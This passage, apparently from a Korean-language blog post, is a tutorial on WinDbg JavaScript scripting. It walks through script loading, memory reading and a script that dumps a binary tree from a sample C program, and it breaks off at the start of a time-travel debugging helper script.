class="hljs-string">&apos;D:\windbg_Ext\utils.js&apos;</span>    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span class="hljs-string">&apos;D:\windbg_Ext\codecov.js&apos;</span>    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span class="hljs-string">&apos;C:\Program Files\WindowsApps\Microsoft.WinDbg_1.2504.15001.0_x64__8wekyb3d8bbwe\amd64\winext\ApiExtension\CodeFlow.js&apos;</span>Other Clients<span class="hljs-string">&apos; Scripts:</span><span class="hljs-string">    Script named &apos;</span>untitled0<span class="hljs-string">&apos;</span><span class="hljs-string">    Script named &apos;</span>untitled1<span class="hljs-string">&apos;</span></code></pre></li></ul></li><li><p><code>.scriptload</code> &amp; <code>.scriptunload</code></p><ul><li>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; load, unload&#xD558;&#xB294; &#xCEE4;&#xB9E8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xC804;&#xCCB4; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xAC70;&#xB098; &#xC774;&#xB984;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xBA74; PATH &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB85C; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB4E4;&#xC5D0;&#xC11C; &#xD0D0;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>.scriptload</code>&#xB85C;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; <code>initializeScript</code> &#xD568;&#xC218;&#xB9CC; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><code>.scriptrun</code><ul><li><code>.scriptload</code>&#xC640; &#xB2EC;&#xB9AC; <code>invokeScript</code> &#xD568;&#xC218;&#xAE4C;&#xC9C0;&#xB3C4; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xCEE4;&#xB9E8;&#xB4DC;&#xAC00; <code>.scriptload</code>, <code>.scriptrun</code> &#xB450;&#xAC1C;&#xAC00; &#xC788;&#xB294;&#xB370; &#xC2E4;&#xD589;&#xD560; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; imperative&#xBA74; <code>invokeScript</code>&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xD574;&#xC57C; &#xD558;&#xB2C8;&#xAE4C; run, extension&#xC774;&#xBA74; load&#xB97C; &#xC4F0;&#xBA74; &#xB418;&#xACA0;&#xC8E0;?</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%203.png" alt="image.png"></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>&#xC0C8;&#xB85C;&#xC6B4; &#xC5B8;&#xC5B4;&#x2026;&#xB97C; &#xBC30;&#xC6B0;&#xB294;&#xAC74; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; &#xC9C0;&#xAE08;&#xAECF; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD574;&#xC628; JavaScript&#xCC98;&#xB7FC; <code>console.log</code> &#xAC19;&#xC740;&#xAC74; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xB2C8; &#xC77C;&#xB2E8; &#x201C;Hello World&#x201D;&#xBD80;&#xD130; &#xCF58;&#xC194;&#xC5D0; &#xCD9C;&#xB825;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    host.diagnostics.debugLog(<span class="hljs-string">&quot;Hello World!\n&quot;</span>)}</code></pre><p>&#xC704;&#xCC98;&#xB7FC; <code>console.log</code> &#xB300;&#xC2E0;&#xC5D0; <code>host.diagnostics.debugLog</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB418;&#xB294;&#xB370;&#xC694;? &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xD3C9;&#xBC94;&#xD558;&#xAC8C; &#xC798; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%204.png" alt="image.png"></p><p>&#xB85C;&#xADF8;&#xB97C; &#xCD9C;&#xB825;&#xD560;&#xB54C;&#xB9C8;&#xB2E4; &#xC77C;&#xC77C;&#xC774; &#xC800;&#xB7F0; &#xCF54;&#xB4DC;&#xB97C; &#xCE60; &#xC790;&#xC2E0;&#xC740; &#xC5C6;&#xC73C;&#xB2C8; &#xC544;&#xB798;&#xCC98;&#xB7FC; alias&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xACE0; &#xB300;&#xC2E0; &#xC774;&#xAC78; &#xC0AC;&#xC6A9;&#xD569;&#xC2DC;&#xB2E4; &#x1F923;</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    log(<span class="hljs-string">&quot;Hello World!\n&quot;</span>)}</code></pre><h2 id="Read-amp-Write-Memory"><a href="#Read-amp-Write-Memory" class="headerlink" title="Read &amp; Write Memory"></a>Read &amp; Write Memory</h2><p>&#xACE0;&#xC791; &#xCF58;&#xC194;&#xC5D0; &#x201C;Hello World&#x201D;&#xB098; &#xCD9C;&#xB825;&#xD558;&#xB824;&#xACE0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC4F0;&#xC9C4; &#xC54A;&#xACA0;&#xC8E0;? <code>host.memory</code>&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>readMemoryValues</li><li>readWideString</li><li>readString</li><li>writeMemoryValues</li></ul><p>&#xC624;&#xB298; &#xD574;&#xBCFC; &#xAC74; &#xC774;&#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xC544;&#xB3C4; &#xCDA9;&#xBD84;&#xD569;&#xB2C8;&#xB2E4;!</p><h1 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h1><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC608;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xBA74;&#xC11C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC5B4;&#xB5A4; &#xC0C1;&#xD669;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC744;&#xC9C0; &#xC0AC;&#xC6A9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="1-Dump-Data-Structure"><a href="#1-Dump-Data-Structure" class="headerlink" title="1. Dump Data Structure"></a>1. Dump Data Structure</h2><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD574;&#xBCFC; &#xAC83;&#xC740; &#xC544;&#xAE4C; &#xC608;&#xC2DC;&#xB97C; &#xB4E4;&#xC5C8;&#xB358; &#xC790;&#xB8CC;&#xAD6C;&#xC870; &#xB364;&#xD504;&#xD558;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;. &#xC608;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; ChatGPT&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC92C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> {</span>    <span class="hljs-keyword">char</span>* word;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">left</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">right</span>;</span>} Node;<span class="hljs-function">Node* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* word)</span> </span>{    Node* newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));    <span class="hljs-keyword">if</span> (!newNode) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;    newNode-&gt;word = _strdup(word);    newNode-&gt;left = <span class="hljs-literal">NULL</span>;    newNode-&gt;right = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">return</span> newNode;}<span class="hljs-function">Node* <span class="hljs-title">insert</span><span class="hljs-params">(Node* root, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* word)</span> </span>{    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) {        <span class="hljs-keyword">return</span> createNode(word);    }    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(word, root-&gt;word) &lt; <span class="hljs-number">0</span>) {        root-&gt;left = insert(root-&gt;left, word);    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(word, root-&gt;word) &gt; <span class="hljs-number">0</span>) {        root-&gt;right = insert(root-&gt;right, word);    }    <span class="hljs-keyword">return</span> root;}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(Node* root)</span> </span>{    <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) {        inorderTraversal(root-&gt;left);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, root-&gt;word);        inorderTraversal(root-&gt;right);    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeTree</span><span class="hljs-params">(Node* root)</span> </span>{    <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) {        freeTree(root-&gt;left);        freeTree(root-&gt;right);        <span class="hljs-built_in">free</span>(root-&gt;word);        <span class="hljs-built_in">free</span>(root);    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* words[<span class="hljs-number">10</span>] = {        <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;grape&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-string">&quot;kiwi&quot;</span>,        <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;lemon&quot;</span>, <span class="hljs-string">&quot;mango&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>, <span class="hljs-string">&quot;melon&quot;</span>    };    Node* root = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {        root = insert(root, words[i]);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address of root node: %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)root);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Press Enter to exit...&quot;</span>);    getchar();    freeTree(root);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xC9C4; &#xD2B8;&#xB9AC;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC21C;&#xC11C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xCF54;&#xB4DC;&#xC778;&#xB370;&#xC694;? &#xB8E8;&#xD2B8; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xCF58;&#xC194; &#xC785;&#xB825;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;. &#xB514;&#xBC84;&#xAC70;&#xB97C; attach&#xD558;&#xACE0; &#xD2B8;&#xB9AC;&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9DC;&#xBA74; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%205.png" alt="image.png"></p><p>&#xC77C;&#xB2E8; <code>Node</code>&#xAC00; 3&#xAC1C;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xCD1D; &#xAE38;&#xC774; 0x18 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB2C8;&#xAE4C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; getNode &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}</code></pre><p>&#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4;&#xC624;&#xB294; &#xB3D9;&#xC791;&#xC740; <code>host.memory.readMemoryValues</code>&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294;&#xB370;&#xC694;? &#xBCF4;&#xBA74; &#xB290;&#xB08C;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; &#xB178;&#xB4DC;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xC778; <code>addr</code>&#xC5D0;&#xC11C; 8&#xBC14;&#xC774;&#xD2B8;&#xC529;(&#xC138; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130;; <code>elementSize</code>) &#xCD1D; 3&#xAC1C;(&#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130;; <code>numElements</code>)&#xC758; element&#xB97C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC18;&#xD658;&#xB418;&#xB294; &#xAC83;&#xC740; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC815;&#xC218;&#xB85C; &#xC800;&#xC7A5;&#xB41C; &#xBC30;&#xC5F4;&#xC774;&#xACE0; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB178;&#xB4DC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; <code>Node</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC73C;&#xB2C8; &#xB2E4;&#xC74C;&#xC73C;&#xB85C;&#xB294; &#xD2B8;&#xB9AC;&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xAC04;&#xB2E8;&#xD788; <code>getNode</code>&#xB85C; &#xBC18;&#xD658;&#xB41C; &#xB178;&#xB4DC;&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC911;&#xC704; &#xC21C;&#xD68C;&#xB97C; &#xD558;&#xBA74;&#xC11C; word&#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC77D;&#xC5B4; &#xCD9C;&#xB825;&#xD558;&#xB294; <code>traverse</code>&#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">node</span>)</span>{    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;left&quot;</span>]))    log(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;right&quot;</span>]))}</code></pre><p>&#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xB294; &#xC704;&#xCC98;&#xB7FC; <code>host.memory.readString</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB418;&#xB294;&#xB370;&#xC694;? &#xBB38;&#xC790;&#xC5F4;&#xC774; WideString&#xC774;&#xB77C;&#xBA74; <code>readWideString</code>&#xC744; &#xB300;&#xC2E0; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">node</span>)</span>{    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;left&quot;</span>]))    log(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;right&quot;</span>]))}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    traverse(getNode(<span class="hljs-number">0x25DD2C211C0</span>))}</code></pre><p>&#xB9CC;&#xC57D;&#xC5D0; &#xB2E8;&#xC21C; &#xCD9C;&#xB825;&#xC744; &#xB118;&#xC5B4; &#xD2B9;&#xC815; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74;? &#xADF8;&#xB0E5; &#xB370;&#xC774;&#xD130; &#xBE44;&#xAD50; &#xB4F1; &#xC870;&#xAC74;&#xB9CC; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-keyword">const</span> dat = <span class="hljs-string">&quot;melon&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = getNode(addr)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(node[<span class="hljs-string">&quot;left&quot;</span>])    <span class="hljs-keyword">if</span>(dat.localeCompare(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>])) == <span class="hljs-number">0</span>){        log(<span class="hljs-string">&quot;Found at &quot;</span> + addr.toString(<span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)    }    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(node[<span class="hljs-string">&quot;right&quot;</span>])}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    traverse(<span class="hljs-number">0x25DD2C211C0</span>)}</code></pre><p>&#xC704; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#x201C;melon&#x201D;&#xC774;&#xB780; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xB9DE;&#xC73C;&#xBA74; &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xACE0; &#xC788;&#xACE0; &#xADF8; &#xACB0;&#xACFC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#x201C;melon&#x201D;&#xC774;&#xB780; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">Found</span> at <span class="hljs-number">25</span>dd<span class="hljs-number">2</span>c<span class="hljs-number">21280</span><span class="hljs-attribute">0</span>:<span class="hljs-number">004</span>&gt; da poi(<span class="hljs-number">25</span>dd<span class="hljs-number">2</span>c<span class="hljs-number">21280</span>)<span class="hljs-attribute">0000025d</span>`d<span class="hljs-number">2</span>c<span class="hljs-number">19360</span>  <span class="hljs-string">&quot;melon&quot;</span></code></pre><h2 id="2-TTD"><a href="#2-TTD" class="headerlink" title="2. TTD"></a>2. TTD</h2><p>imperative &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBD24;&#xC73C;&#xB2C8; &#xC774;&#xBC88;&#xC5D0;&#xB294; extension&#xC758; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. extension &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xC608;&#xC81C;&#xB85C;&#xB294; &#xC81C;&#xAC00; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xBB34;&#xC870;&#xAC74; &#xC4F0;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF4;&#xC2DC;&#xC8E0;.</p><pre><code class="hljs jsx"><span class="hljs-meta">&apos;use strict&apos;</span>;<span class="hljs-keyword">const</span> log = host.diagnostics.debugLog;<span class="hljs-keyword">const</span> logln = <span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> host.diagnostics.debugLog(p + <span class="hljs-string">&apos;\n&apos;</span>);<span class="hljs-keyword">const</span> hex = <span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.toString(<span class="hljs-number">16</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__calls</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Calls(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memory</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Memory(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memoryforpositionrange</span>(<span class="hljs-params">...args</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.MemoryForPositionRange(...args);}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ttdParsePosition</span>(<span class="hljs-params">pos</span>)</span>{<span class="hljs-keyword">var</span> sequence = <span class="hljs-number">0</span><span class="hljs-keyword">var</span> steps = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(pos) == <span class="hljs-string">&quot;string&quot;</span>){sequence = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)steps = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)}<span class="hljs-keyword">else</span>{sequence = pos.Sequencesteps = pos.Steps}<span class="hljs-keyword">return</span> {Sequence: sequence,Steps: steps}}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__ttd_position_compare</span>(<span class="hljs-params">pos1, 